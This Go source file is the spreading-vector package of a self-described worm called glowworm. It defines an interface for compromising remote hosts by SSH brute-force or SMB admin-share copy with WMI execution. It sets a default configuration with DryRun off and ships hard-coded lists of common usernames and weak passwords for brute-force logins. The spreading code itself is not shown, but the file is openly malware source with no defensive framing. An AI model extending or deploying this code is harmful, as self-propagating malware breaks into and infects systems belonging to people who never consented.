/*
// Author: Aliasgar Khimani (NovusEdge)
// Project: github.com/ARaChn3/glowworm
//
// Copyright: MIT License
// See the LICENSE file for more info.
*/

// Package vectors provides spreading mechanisms for the worm.
//
// A vector is a method of compromising a remote system and
// executing the worm payload on it. Currently supported vectors:
//   - SSH: Brute-force login, then copy and execute
//   - SMB: Copy to admin share, execute via WMI
package vectors

// Vector is the interface for spreading mechanisms.
//
// Each vector implements a specific method of compromising
// and infecting remote systems.
type Vector interface {
	// Name returns the vector identifier (e.g., "ssh", "smb")
	Name() string

	// Spread attempts to compromise and infect a target host.
	// Returns true if successful, false otherwise.
	Spread(target string, payload []byte) (bool, error)

	// Check verifies if the target is vulnerable to this vector.
	Check(target string) bool
}

// Config holds common configuration for vectors.
type Config struct {
	// Timeout for connection attempts (seconds)
	Timeout int

	// Usernames to try for authentication
	Usernames []string

	// Passwords to try for authentication
	Passwords []string

	// DryRun mode - don't actually spread
	DryRun bool
}

// DefaultConfig returns sensible defaults for vector configuration.
func DefaultConfig() Config {
	return Config{
		Timeout:   10,
		Usernames: DefaultUsernames,
		Passwords: DefaultPasswords,
		DryRun:    false,
	}
}

// DefaultUsernames are common usernames to try.
// In a real scenario, you'd want a larger list.
var DefaultUsernames = []string{
	"root",
	"admin",
	"administrator",
	"user",
	"ubuntu",
	"pi",
	"test",
	"guest",
}

// DefaultPasswords are common weak passwords.
// These represent the most commonly used passwords.
var DefaultPasswords = []string{
	"password",
	"123456",
	"admin",
	"root",
	"toor",
	"password123",
	"admin123",
	"letmein",
	"welcome",
	"monkey",
	"12345678",
	"qwerty",
}

// Result represents the outcome of a spreading attempt.
type Result struct {
	// Target IP address
	Target string

	// Vector used (e.g., "ssh", "smb")
	Vector string

	// Success indicates if infection succeeded
	Success bool

	// Message provides details about the result
	Message string

	// Credentials used (if authentication-based)
	Username string
	Password string
}
